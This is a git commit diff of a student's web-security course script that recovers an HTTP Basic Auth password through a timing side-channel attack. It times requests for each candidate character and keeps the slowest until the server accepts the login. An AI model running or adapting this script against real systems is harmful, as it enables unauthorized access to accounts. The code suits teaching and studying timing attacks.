72eb39d1690f3c4e0da46fb7f3752e86c489e968
rogers1lt <rogers1lt@live.com>
2017-11-07 13:05:36 -0800

    Code works for a known username

--- web_sec_p2.py
+++ web_sec_p2.py
@@ -1,45 +1,82 @@
+"""
+CS510 Web Security Program 2
+Andrew Rogers
+Fall 2017
+"""
+
 import sys
 import string
 import time
 import requests
 from requests.auth import HTTPBasicAuth
+from operator import itemgetter
 
 
 def run_test(payload, url):
-    resp = requests.get(url,auth=HTTPBasicAuth('hacker',payload))
-    return resp
-
-
-def check_char(known_chars, url):
     """
-    Performs a test with the previously derived known characters joined with
-    one of the alphanumeric characters at a time
-    :param known_chars: A string containing the correct password characters
+    Records timing data for an individual time attack event
+    :param payload: the password string to be tested
+    :param url: the target website
+    :return: the time in float to complete the attack event
+    """
+    total_time = 0
+    while total_time <= 0:  # error checking to prevent timing errors
+        pre_time = time.time()
+        requests.get(url, auth=HTTPBasicAuth('hacker', payload))
+        total_time = time.time() - pre_time
+    return total_time
+
+
+def range_testing(poss_chars, known_login, known_pass, url):
+    """
+    Builds a list of test results and sorts from the longest duration
+    to shortest over a range of provided characters
+    :param poss_chars: this is the range of characters to be considered
+    :param known_pass: The previously derived character to be built upon
+    :param url: the target url for the attack
+    :return: A list of the top ten (in order) most likely characters
+    """
+    test_list = []
+    for test_char in poss_chars:
+        load = known_pass + test_char
+        print("The current test is %s" % load)
+        total_time = run_test(load, url)
+        print("Time for %s was %f" % (load, total_time))
+        test_list.append((total_time, test_char))
+    test_list.sort(key=itemgetter(0), reverse=True)  # sorting the list
+    result_list = []
+    for pass_char in test_list[:10]:
+        result_list.append(pass_char[1])
+    return result_list
+
+
+def check_char(known_login, known_pass, url):
+    """
+    Organizes the test of all alphanumeric characters and then runs a test
+    of the top ten results from the 1st test to provide error checking
+
+    :param known_login: A string containing the correct login characters
+    already found so far.
+    :param known_pass: A string containing the correct password characters
     already found so far.
     :param url: The website for the basic auth test
     :return: the list of known characters with a new correct character
     attached.
     """
-    if known_chars:
-        test_load = known_chars  #test_load the test string for comparison
+    if known_login:
+        test_login = known_login  # test_load the test string for comparison
     else:
-        test_load = ""
-    longest_time = [0, '']
-    sample_range = string.ascii_letters + string.digits
-    for test_char in sample_range:
-        ##TODO Need to build a sorted list for final comparison
-        load = test_load + test_char
-        print("The current character is %s" % load)
-        pre_time = time.time()
-        run_test(load, url)
-        total_time = [time.time() - pre_time, test_char]
-        if total_time[0] > longest_time[0]:
-            longest_time = total_time
-            print("New longest time of %f for character %s" % (total_time[0],test_char))
-        else:
-            print("The current character's time of %f is %f less than longest" % (total_time[0], (longest_time[0]-total_time[0])))
-        print("The current likely character is %s" % longest_time[1])
-    return known_chars + longest_time[1]
+        test_login = ""
+    if known_pass:
+        test_pass = known_pass  # test_load the test string for comparison
+    else:
+        test_pass = ""
+    sample_range = string.ascii_letters + string.digits  # building range of all alphanumeric
+    top_ten = range_testing(sample_range, test_login, test_pass, url)
+    print("Testing the top 10 results")
+    final_test = range_testing(top_ten, test_login, test_pass, url)
+    print("The slowest character was %s" % final_test[0])
+    return known_pass + final_test[0]
 
 
 def main():
@@ -48,17 +85,21 @@ def main():
         print("You failed to provide a target URL on the command line!")
         sys.exit(1)  # abort because of error
     test_url = sys.argv[1]
-    if (test_url[:7].lower() != "http://"):
+    if test_url[:7].lower() != "http://":
         print("ERROR:: Expecting URL beginning with \'http://\' ")
         sys.exit(1)  # abort because of error
-    print("Target site = %s" % test_url)
+    url_status = requests.get(test_url)  # validate the url
+    if url_status.status_code != 401:
+        print("URL in error or without authentication with status code %d" % url_status)
 
-    known_chars = ""
+    # Beginning the actual attack
+    known_login = "" # This is holder of the username as it is being built
+    known_pass = ""  # This is holder of the password as it is being built
+    while requests.get(test_url, auth=HTTPBasicAuth(known_login, known_pass)).status_code == 401:
+        known_pass = check_char(known_login, known_pass, test_url)
 
-    while run_test(known_chars, test_url).status_code == 401:
-        known_chars = check_char(known_chars, test_url)
+    print("\n\nFinished! \n The password is %s" % known_pass)
 
-    print("The password is %s" % known_chars)
 
 if __name__ == '__main__':
     main()
